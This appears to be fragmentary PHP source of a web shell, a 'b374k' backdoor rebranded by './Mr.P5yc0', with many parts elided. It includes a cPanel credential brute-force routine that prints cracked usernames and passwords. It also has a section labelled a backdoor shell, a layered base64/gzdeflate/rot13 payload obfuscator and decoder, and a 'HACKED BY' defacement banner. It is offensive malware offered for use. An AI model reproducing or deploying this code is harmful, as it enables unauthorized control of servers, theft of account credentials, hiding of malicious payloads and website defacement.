...
//config
?>
<html><head><link rel="SHORTCUT ICON" href="http://img11.deviantart.net/3bda/i/2015/196/a/8/slipknot_logo_design_by_alberth_kill2590-d91h8bd.png"><title>..::[ ./Mr.P5yc0 ]::..</title>
...
.p5yc0{ font-family:Vivaldi;font-size:50px;color: #00FF00;}
.tabnet{
...
<div class="head_info">
<table ><tr>
<td><table class="b374k_tbl"><tr><td><a href="javascript:void(0)" onclick="location.reload();"><span class="b374k"><img src="http://img11.deviantart.net/3bda/i/2015/196/a/8/slipknot_logo_design_by_alberth_kill2590-d91h8bd.png" width="230" height="230"/></span></a></td></tr><tr><td><b>./Mr.P5yc0 Shell</b></td></tr></table></td>
<td><?php echo $buff; ?></td>
</tr></table>
</div>
<!-- head info end here -->
    ...
    foreach($a1 as $user )
    {
        ...
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            ...
            {
                echo "BruteForce CPanel by ./Mr.P5yc0 ~ user is (<b><font style='color:#ff0000'>$user</font></b>) Password is (<b><font style='color:#ff0000'>$pass</font></b>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<hr><b>You Found [<font style='color:#ff0000'> $ok </font>] Cpanel by ./Mr.P5yc0</b>";
...
echo"<center><br><br><b>+--=[ Collection +10k Wordlist by ./Mr.P5yc0 ]=--+</b><br><br>
<textarea style=\"background:black;outline:none;\" cols=\"90\" rows=\"20\" name=\"usernames\">";
echo $wl;
echo"</textarea>
</center><br>";
...
<input name="passlis" type="hidden" value="passwordlis">        				
    ...
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Wordlist by ./Mr.P5yc0 :</strong></td>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
	</td>
    </tr>
...
<tr><td>
<input class='inputzbut'value='Change' name='Psyc0' type='submit'></td></tr></tr>
</table></form>
...
<br><br><br><br><center><div class=\"info\"><b>[__Backdoor shell__]</div> 
<br><br><div class=\"jaya\"> &copy; ".date('Y',time())." ./Mr.P5yc0 </b></div></center>");
...
<option value="str">str_rot13 - base64</option>
<option value="str2">str_rot13 - gzinflate - base64</option>
<option value="str3">str_rot13 - gzinflate - str_rot13 - base64</option>
<option value="gzinflate">gzinflate - base64</option>
<option value="gzinflate2">gzinflate - str_rot13 - base64</option>
<option value="gzinflate3">gzinflate - str_rot13 - gzinflate - base64</option>
<option value="psyco">str_rot13 - gzinflate - str_rot13 - base64 - gzinflate - str_rot13 -  base64</option>
<option value="psyco2">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
<option value="base6416x">Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64</option>
...
break;case 'str' : $codi=base64_encode(str_rot13($text));
break;case 'str2' : $codi=base64_encode(gzdeflate(str_rot13($text)));
break;case 'str3' : $codi=base64_encode(str_rot13(gzdeflate(str_rot13($text))));
break;case 'gzinflate' : $codi=base64_encode(gzdeflate($text));
break;case 'gzinflate2' : $codi=base64_encode(str_rot13(gzdeflate($text)));
break;case 'gzinflate3' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
break;case 'psyco' : $codi=base64_encode(str_rot13(gzdeflate(base64_encode(str_rot13(gzdeflate(str_rot13($text)))))));
break;case 'psyco2' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
...
break;case 'str' : $codi=str_rot13(base64_decode($text));
break;case 'str2' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;case 'str3' : $codi=str_rot13(gzinflate(str_rot13(base64_decode($text))));
break;case 'gzinflate' : $codi=gzinflate(base64_decode($text));
break;case 'gzinflate2' : $codi=gzinflate(str_rot13(base64_decode($text)));
break;case 'gzinflate3' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
break;case 'psyco' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(gzinflate(str_rot13(base64_decode($text)))))));
break;case 'psyco2' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode($text))))));
...
HACKED BY ./Mr.P5yc0, PATCH YOUR SECURITY SYSTEM 
...
elseif(isset($_GET['x']) && ($_GET['x'] == 'about'))
    {@ini_set('output_buffering',0); 
    ?><form action="?y=<?php echo $pwd; ?>&x=about" method="post"><center><br><br><div class='p5yc0'>"Terbatas bukan berarti berhenti berkreatifitas"</div>
<br><br><br>terimakasih buat teman-teman ku<br><br></center><center><marquee direction="up" scrollamount="2" bgcolor="" width="250" height="40"><center>
<p><b><font size="3" color="#00ff00">By<br>./Mr.P5yc0<br><br><br>
...
?><center><br><br><div class="info">-=[ b374k r3c0ded by <b>./Mr.P5yc0</b> ]=-</div><br>
<div class="jaya">&copy; <?php echo date('Y',time()); ?> KPN Family</div></center><br><br>
</script>
</div>
</body>
</html>